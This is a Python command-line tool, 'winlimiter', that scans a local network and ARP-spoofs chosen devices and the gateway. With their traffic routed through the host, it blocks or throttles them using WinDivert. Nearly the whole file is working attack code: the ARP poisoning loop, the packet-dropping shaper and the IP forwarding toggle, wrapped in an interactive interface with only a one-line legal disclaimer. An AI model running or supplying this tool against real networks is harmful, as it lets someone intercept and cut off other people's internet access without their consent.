#!/usr/bin/env python3
"""
winlimiter - a native-Windows bandwidth limiter in the spirit of evillimiter.

Technique (same idea as evillimiter, Windows plumbing):
  * ARP spoofing  -> scapy + Npcap  (make a target route its traffic through us)
  * throttle/block -> WinDivert via pydivert + Windows IP forwarding

Requirements:
  * Run as Administrator (WinDivert loads a kernel driver).
  * Npcap installed (WinPcap-compatible mode).
  * pip install scapy pydivert

AUTHORIZED USE ONLY: run this only against devices on a network you own or
are explicitly allowed to test. ARP spoofing other networks is illegal.
"""

import os
import sys
import time
import socket
import tempfile
import threading
import subprocess
import ctypes
import urllib.request
from concurrent.futures import ThreadPoolExecutor

# ---- Npcap pinned installer (official) -------------------------------------
NPCAP_VERSION = "1.82"
NPCAP_URL = f"https://npcap.com/dist/npcap-{NPCAP_VERSION}.exe"

# scapy/pydivert are imported lazily by _load_net_libs() AFTER Npcap is in
# place, because importing scapy on a machine without Npcap can hard-fail.
pydivert = None
conf = get_if_hwaddr = Ether = ARP = srp = sendp = get_working_ifaces = None


def _load_net_libs():
    global conf, get_if_hwaddr, Ether, ARP, srp, sendp, get_working_ifaces
    global pydivert
    from scapy.all import (conf, get_if_hwaddr, Ether, ARP, srp, sendp,
                           get_working_ifaces)
    try:
        import pydivert as _pd
        pydivert = _pd
    except Exception:
        pydivert = None


# ----------------------------------------------------------------------------
# bootstrap: these run BEFORE scapy/pydivert are imported, because importing
# scapy on a machine without Npcap can itself fail. Order: elevate -> Npcap.
# ----------------------------------------------------------------------------

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False


def require_admin():
    """Hard requirement: if not elevated, relaunch self via UAC and exit.
    If the user declines the prompt, the app does not run."""
    if is_admin():
        return
    print("[*] Administrator rights are required - requesting elevation ...")
    if getattr(sys, "frozen", False):
        exe, params = sys.executable, subprocess.list2cmdline(sys.argv[1:])
    else:
        exe, params = sys.executable, subprocess.list2cmdline(sys.argv)
    try:
        # ShellExecuteW 'runas' triggers the UAC prompt; >32 == success
        rc = ctypes.windll.shell32.ShellExecuteW(None, "runas", exe, params,
                                                 None, 1)
        if rc <= 32:
            print("[!] Elevation was declined. winlimiter needs Administrator"
                  " to run. Exiting.")
    except Exception as e:
        print(f"[!] Could not elevate: {e}")
    sys.exit(1)


def npcap_installed():
    root = os.environ.get("SystemRoot", r"C:\Windows")
    return any(os.path.exists(p) for p in (
        os.path.join(root, "System32", "Npcap", "wpcap.dll"),
        os.path.join(root, "System32", "wpcap.dll"),
        os.path.join(root, "SysWOW64", "Npcap", "wpcap.dll"),
    ))


def ensure_npcap():
    """Download + launch the official Npcap installer if Npcap is missing.
    Returns True once Npcap is present."""
    if npcap_installed():
        return True
    print("[*] Npcap (packet driver) is required but not installed.")
    dst = os.path.join(tempfile.gettempdir(), f"npcap-{NPCAP_VERSION}.exe")
    try:
        print(f"[*] downloading {NPCAP_URL} ...")
        urllib.request.urlretrieve(NPCAP_URL, dst)
    except Exception as e:
        print(f"[!] download failed: {e}")
        print("    Install Npcap manually from https://npcap.com and re-run.")
        try:
            os.startfile("https://npcap.com")  # open the site to help
        except Exception:
            pass
        return False
    print("[*] launching the Npcap installer - click through it and KEEP the"
          " default\n    option 'Install Npcap in WinPcap API-compatible Mode'.")
    try:
        subprocess.run([dst], check=False)   # GUI installer; user confirms
    except Exception as e:
        print(f"[!] could not launch installer: {e}")
        return False
    if npcap_installed():
        print("[+] Npcap installed.")
        return True
    print("[!] Npcap still not detected. Finish the install, then re-run"
          " winlimiter.")
    return False


def ensure_windivert():
    """Step-3 self-check: confirm pydivert's bundled WinDivert driver files are
    present (they are collected into the exe at build time). Warns if missing so
    'limit' failures are explained rather than silent."""
    try:
        import pydivert as _pd
    except Exception:
        return False
    pkg = os.path.dirname(_pd.__file__)
    for _root, _dirs, files in os.walk(pkg):
        for f in files:
            fl = f.lower()
            if fl.startswith("windivert") and fl.endswith(".dll"):
                return True
    print("[!] WinDivert driver (WinDivert*.dll) not found alongside pydivert -"
          " 'limit' may fail. Rebuild with: pyinstaller --collect-all pydivert")
    return False


def parse_rate(text):
    """'500kbit' / '2mbit' / '750kbps' / '1mbps' -> bytes per second."""
    t = text.strip().lower()
    mult_bits = {"kbit": 1000, "mbit": 1_000_000, "gbit": 1_000_000_000}
    mult_bytes = {"kbps": 1000, "mbps": 1_000_000, "gbps": 1_000_000_000}
    for suf, m in mult_bits.items():
        if t.endswith(suf):
            return int(float(t[:-len(suf)]) * m / 8)
    for suf, m in mult_bytes.items():
        if t.endswith(suf):
            return int(float(t[:-len(suf)]) * m)
    raise ValueError("rate must look like 500kbit, 2mbit, 750kbps, 1mbps")


def parse_rate(text):
    """'500kbit' / '2mbit' / '750kbps' / '1mbps' -> bytes per second."""
    t = text.strip().lower()
    mult_bits = {"kbit": 1000, "mbit": 1_000_000, "gbit": 1_000_000_000}
    mult_bytes = {"kbps": 1000, "mbps": 1_000_000, "gbps": 1_000_000_000}
    for suf, m in mult_bits.items():
        if t.endswith(suf):
            return int(float(t[:-len(suf)]) * m / 8)
    for suf, m in mult_bytes.items():
        if t.endswith(suf):
            return int(float(t[:-len(suf)]) * m)
    raise ValueError("rate must look like 500kbit, 2mbit, 750kbps, 1mbps")


class TokenBucket:
    """Classic token bucket. Capacity = 1s burst."""
    def __init__(self, rate_bytes):
        self.rate = float(rate_bytes)
        self.capacity = float(rate_bytes)
        self.tokens = float(rate_bytes)
        self.ts = time.monotonic()

    def allow(self, nbytes):
        now = time.monotonic()
        self.tokens = min(self.capacity, self.tokens + (now - self.ts) * self.rate)
        self.ts = now
        if self.tokens >= nbytes:
            self.tokens -= nbytes
            return True
        return False


# ----------------------------------------------------------------------------
# core engine
# ----------------------------------------------------------------------------

class WinLimiter:
    def __init__(self):
        # default route -> our iface name, our ip, gateway ip
        iface_name, our_ip, gw_ip = conf.route.route("0.0.0.0")
        self.gateway_ip = gw_ip
        self.our_ip = our_ip

        # resolve the scapy NetworkInterface object + our MAC
        self.iface = None
        for i in get_working_ifaces():
            if getattr(i, "ip", None) == our_ip:
                self.iface = i
                break
        if self.iface is None:
            self.iface = iface_name
        self.our_mac = get_if_hwaddr(self.iface)

        self.subnet = our_ip.rsplit(".", 1)[0] + ".0/24"
        self.gateway_mac = None

        # discovered hosts: ip -> mac
        self.hosts = {}
        self.hostnames = {}  # ip -> name
        # active targets: ip -> {"mac", "mode": block|limit, "rate", "bucket"}
        self.targets = {}
        self._lock = threading.Lock()

        self._forwarding_on = False
        self._spoof_thread = None
        self._shaper_thread = None
        self._running = False

    # -- discovery ----------------------------------------------------------
    def resolve_mac(self, ip):
        ans, _ = srp(
            Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
            timeout=2, retry=1, iface=self.iface, verbose=0,
        )
        for _, r in ans:
            return r.hwsrc
        return None

    def resolve_hostname(self, ip):
        # 1) reverse DNS (fast when the router runs a DNS that knows leases)
        try:
            socket.setdefaulttimeout(1.0)
            name = socket.gethostbyaddr(ip)[0]
            if name and name != ip:
                return name.split(".")[0]
        except Exception:
            pass
        # 2) NetBIOS name query (works for most Windows / phones / IoT)
        try:
            out = subprocess.run(["nbtstat", "-A", ip],
                                 capture_output=True, timeout=3)
            text = out.stdout.decode("cp850", "ignore")
            for line in text.splitlines():
                u = line.upper()
                if "<00>" in u and "UNIQUE" in u:
                    nm = line.strip().split("<00>")[0].strip()
                    if nm:
                        return nm
        except Exception:
            pass
        return "?"

    def scan(self):
        print(f"[*] scanning {self.subnet} ...")
        ans, _ = srp(
            Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=self.subnet),
            timeout=3, retry=1, iface=self.iface, verbose=0,
        )
        self.hosts = {}
        for _, r in ans:
            if r.psrc not in (self.our_ip,):
                self.hosts[r.psrc] = r.hwsrc
        if self.gateway_ip in self.hosts:
            self.gateway_mac = self.hosts[self.gateway_ip]
        elif self.gateway_mac is None:
            self.gateway_mac = self.resolve_mac(self.gateway_ip)

        # resolve hostnames in parallel so the scan stays snappy
        ips = list(self.hosts.keys())
        if ips:
            print(f"[*] resolving {len(ips)} hostname(s) ...")
            with ThreadPoolExecutor(max_workers=16) as ex:
                for ip, name in zip(ips, ex.map(self.resolve_hostname, ips)):
                    self.hostnames[ip] = name
        return self.hosts

    def list_hosts(self):
        print(f"\n   our ip   : {self.our_ip}  ({self.our_mac})")
        print(f"   gateway  : {self.gateway_ip}  ({self.gateway_mac})\n")
        print("   id  ip-address        mac-address         hostname              status")
        print("   " + "-" * 78)
        for idx, (ip, mac) in enumerate(sorted(self.hosts.items())):
            if ip == self.gateway_ip:
                continue
            st = ""
            if ip in self.targets:
                t = self.targets[ip]
                st = "BLOCKED" if t["mode"] == "block" else f"LIMIT {t['rate_str']}"
            name = (self.hostnames.get(ip) or "?")[:20]
            print(f"   {idx:<3} {ip:<16} {mac:<19} {name:<21} {st}")
        print()

    def host_by_id(self, idx):
        for i, ip in enumerate(sorted(self.hosts.keys())):
            if i == idx:
                return ip
        return None

    # -- windows forwarding -------------------------------------------------
    def _set_forwarding(self, enable):
        state = "Enabled" if enable else "Disabled"
        ps = (
            f"$a = Get-NetIPAddress -IPAddress {self.our_ip} "
            f"-ErrorAction SilentlyContinue; "
            f"if ($a) {{ Set-NetIPInterface -InterfaceIndex "
            f"$a.InterfaceIndex -Forwarding {state} -ErrorAction SilentlyContinue }}"
        )
        subprocess.run(["powershell", "-NoProfile", "-Command", ps],
                       capture_output=True)
        self._forwarding_on = enable

    # -- arp spoof loop -----------------------------------------------------
    def _spoof_once(self):
        with self._lock:
            tgts = list(self.targets.items())
        for ip, t in tgts:
            # tell target: gateway is at our MAC
            sendp(Ether(dst=t["mac"], src=self.our_mac) /
                  ARP(op=2, psrc=self.gateway_ip, hwsrc=self.our_mac,
                      pdst=ip, hwdst=t["mac"]),
                  iface=self.iface, verbose=0)
            # tell gateway: target is at our MAC
            sendp(Ether(dst=self.gateway_mac, src=self.our_mac) /
                  ARP(op=2, psrc=ip, hwsrc=self.our_mac,
                      pdst=self.gateway_ip, hwdst=self.gateway_mac),
                  iface=self.iface, verbose=0)

    def _spoof_loop(self):
        while self._running:
            try:
                self._spoof_once()
            except Exception as e:
                print(f"[!] spoof error: {e}")
            time.sleep(2)

    def _restore(self, ip, mac):
        # push the real mappings back a few times
        for _ in range(5):
            sendp(Ether(dst=mac, src=self.gateway_mac) /
                  ARP(op=2, psrc=self.gateway_ip, hwsrc=self.gateway_mac,
                      pdst=ip, hwdst=mac), iface=self.iface, verbose=0)
            sendp(Ether(dst=self.gateway_mac, src=mac) /
                  ARP(op=2, psrc=ip, hwsrc=mac,
                      pdst=self.gateway_ip, hwdst=self.gateway_mac),
                  iface=self.iface, verbose=0)
            time.sleep(0.2)

    # -- windivert shaper ---------------------------------------------------
    def _shaper_loop(self):
        # FORWARD layer: only packets routed *through* us (i.e. our targets)
        with pydivert.WinDivert("ip", layer=pydivert.Layer.NETWORK_FORWARD) as w:
            for packet in w:
                drop = False
                with self._lock:
                    # throttle the target's *download* (dst == target)
                    t = self.targets.get(packet.dst_addr)
                    if t:
                        if t["mode"] == "block":
                            drop = True
                        elif t["mode"] == "limit":
                            if not t["bucket"].allow(len(packet.raw)):
                                drop = True
                    # a blocked target's uploads should die too
                    if not drop:
                        ts = self.targets.get(packet.src_addr)
                        if ts and ts["mode"] == "block":
                            drop = True
                if not drop:
                    w.send(packet)

    # -- lifecycle ----------------------------------------------------------
    def _ensure_running(self):
        if self._running:
            return
        self._running = True
        self._set_forwarding(True)
        self._spoof_thread = threading.Thread(target=self._spoof_loop, daemon=True)
        self._spoof_thread.start()
        if pydivert is not None:
            self._shaper_thread = threading.Thread(target=self._shaper_loop,
                                                   daemon=True)
            self._shaper_thread.start()

    def add_block(self, ip):
        mac = self.hosts.get(ip) or self.resolve_mac(ip)
        if not mac:
            print(f"[!] could not resolve MAC for {ip}")
            return
        with self._lock:
            self.targets[ip] = {"mac": mac, "mode": "block",
                                "rate_str": "-", "bucket": None}
        self._ensure_running()
        print(f"[+] blocking {ip}")

    def add_limit(self, ip, rate_str):
        rate = parse_rate(rate_str)
        mac = self.hosts.get(ip) or self.resolve_mac(ip)
        if not mac:
            print(f"[!] could not resolve MAC for {ip}")
            return
        if pydivert is None:
            print("[!] pydivert not available - limit needs WinDivert")
            return
        with self._lock:
            self.targets[ip] = {"mac": mac, "mode": "limit",
                                "rate_str": rate_str, "rate": rate,
                                "bucket": TokenBucket(rate)}
        self._ensure_running()
        print(f"[+] limiting {ip} download to {rate_str}")

    def free(self, ip):
        with self._lock:
            t = self.targets.pop(ip, None)
        if not t:
            print(f"[!] {ip} is not a target")
            return
        self._restore(ip, t["mac"])
        print(f"[+] freed {ip}")

    def shutdown(self):
        print("\n[*] restoring network ...")
        self._running = False
        with self._lock:
            tgts = list(self.targets.items())
            self.targets.clear()
        for ip, t in tgts:
            self._restore(ip, t["mac"])
        if self._forwarding_on:
            self._set_forwarding(False)
        print("[*] done.")


# ----------------------------------------------------------------------------
# cli
# ----------------------------------------------------------------------------

HELP = """
commands:
  scan                 re-scan the LAN
  hosts                list discovered hosts (with ids)
  block <id|ip>        cut a device off the internet
  limit <id|ip> <rate> throttle a device's download (e.g. limit 3 1mbit)
  free  <id|ip>        stop acting on a device, restore it
  status               show active targets
  help                 this help
  quit                 restore everything and exit
"""


def resolve_arg(wl, arg):
    if arg.isdigit():
        return wl.host_by_id(int(arg))
    return arg


def main():
    # 1) hard admin requirement (self-elevates via UAC, or exits)
    require_admin()

    # 2) ensure Npcap is present (auto-download + install if missing)
    if not ensure_npcap():
        input("\nPress Enter to exit ...")
        sys.exit(1)

    # 3) now it is safe to import scapy/pydivert; verify WinDivert driver
    _load_net_libs()
    ensure_windivert()
    if pydivert is None:
        print("[!] warning: pydivert not importable - 'limit' will be disabled,"
              " 'block' still works.")

    wl = WinLimiter()
    print("=" * 64)
    print(" winlimiter  (native-Windows bandwidth limiter)")
    print("=" * 64)
    print(HELP)
    wl.scan()
    wl.list_hosts()

    try:
        while True:
            try:
                raw = input("winlimiter> ").strip()
            except EOFError:
                break
            if not raw:
                continue
            parts = raw.split()
            cmd = parts[0].lower()

            if cmd in ("quit", "exit", "q"):
                break
            elif cmd == "help":
                print(HELP)
            elif cmd == "scan":
                wl.scan(); wl.list_hosts()
            elif cmd == "hosts":
                wl.list_hosts()
            elif cmd == "status":
                if not wl.targets:
                    print("   no active targets")
                for ip, t in wl.targets.items():
                    m = "BLOCKED" if t["mode"] == "block" else f"LIMIT {t['rate_str']}"
                    print(f"   {ip:<16} {m}")
            elif cmd == "block" and len(parts) >= 2:
                ip = resolve_arg(wl, parts[1])
                if ip: wl.add_block(ip)
                else: print("[!] unknown host")
            elif cmd == "limit" and len(parts) >= 3:
                ip = resolve_arg(wl, parts[1])
                if ip:
                    try: wl.add_limit(ip, parts[2])
                    except ValueError as e: print(f"[!] {e}")
                else: print("[!] unknown host")
            elif cmd == "free" and len(parts) >= 2:
                ip = resolve_arg(wl, parts[1])
                if ip: wl.free(ip)
                else: print("[!] unknown host")
            else:
                print("[!] bad command - type 'help'")
    except KeyboardInterrupt:
        pass
    finally:
        wl.shutdown()


if __name__ == "__main__":
    main()
